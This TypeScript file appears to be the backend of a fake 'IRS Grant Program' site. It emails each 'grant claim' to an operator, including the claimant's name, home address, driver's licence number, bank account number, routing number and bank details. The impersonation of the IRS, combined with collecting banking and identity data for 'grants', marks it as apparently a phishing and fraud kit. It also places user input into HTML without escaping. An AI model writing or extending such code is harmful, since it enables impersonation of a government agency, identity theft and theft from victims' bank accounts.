import { Resend } from "resend"

const resend = process.env.RESEND_API_KEY
  ? new Resend(process.env.RESEND_API_KEY)
  : null

export async function sendClaimNotification(claimData: Record<string, unknown>) {
  if (!resend) {
    console.log("Resend not configured — skipping email notification")
    console.log("Claim data:", JSON.stringify(claimData, null, 2))
    return { success: true, skipped: true }
  }

  const method = claimData.method as string
  const uniqueCode = claimData.uniqueCode as string
  const fullName = claimData.fullName as string || "Unknown"
  const email = claimData.email as string || ""
  const amount = claimData.amount as string || "0"

  const formattedAmount = new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    minimumFractionDigits: 0,
  }).format(Number(amount))

  const methodLabel = method === "cashier_check" ? "Cashier Check" : "Electronic Deposit"

  // Build detail rows based on method
  let detailRows = ""
  if (method === "cashier_check") {
    detailRows = `
      <tr><td style="padding: 8px; font-weight: bold;">Name:</td><td style="padding: 8px;">${fullName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Address:</td><td style="padding: 8px;">${claimData.address}, ${claimData.city}, ${claimData.state} ${claimData.zipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Driver's License:</td><td style="padding: 8px;">${claimData.driversLicense}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Email:</td><td style="padding: 8px;">${email}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Received Grants Before:</td><td style="padding: 8px;">${claimData.receivedGrantsBefore}</td></tr>
    `
  } else {
    detailRows = `
      <tr><td style="padding: 8px; font-weight: bold;">Name:</td><td style="padding: 8px;">${fullName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Account Number:</td><td style="padding: 8px;">${claimData.accountNumber}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Routing Number:</td><td style="padding: 8px;">${claimData.routingNumber}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Bank Name:</td><td style="padding: 8px;">${claimData.bankName}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Bank Address:</td><td style="padding: 8px;">${claimData.bankAddress}, ${claimData.bankCity}, ${claimData.bankState} ${claimData.bankZipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Home Address:</td><td style="padding: 8px;">${claimData.homeAddress}, ${claimData.homeCity}, ${claimData.homeState} ${claimData.homeZipCode}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Email:</td><td style="padding: 8px;">${email}</td></tr>
      <tr><td style="padding: 8px; font-weight: bold;">Received Grants Before:</td><td style="padding: 8px;">${claimData.receivedGrantsBefore}</td></tr>
    `
  }

  try {
    const { data, error } = await resend.emails.send({
      from: "IRS Grant Program <onboarding@resend.dev>",
      to: [process.env.NOTIFICATION_EMAIL || "admin@example.com"],
      subject: `New Grant Claim: ${fullName} | ${methodLabel} | ${uniqueCode}`,
      html: `
        <h2>New Grant Claim Submitted</h2>
        <div style="background: #f0fdf4; border: 1px solid #86efac; border-radius: 8px; padding: 16px; margin-bottom: 16px;">
          <strong>Unique Code:</strong> ${uniqueCode}<br/>
          <strong>Grant Amount:</strong> ${formattedAmount}<br/>
          <strong>Payment Method:</strong> ${methodLabel}
        </div>
        <table style="border-collapse: collapse; width: 100%;">
          ${detailRows}
        </table>
      `,
    })

    if (error) {
      console.error("Email error:", error)
      return { success: false, error }
    }

    return { success: true, data }
  } catch (error) {
    console.error("Email send failed:", error)
    return { success: false, error }
  }
}
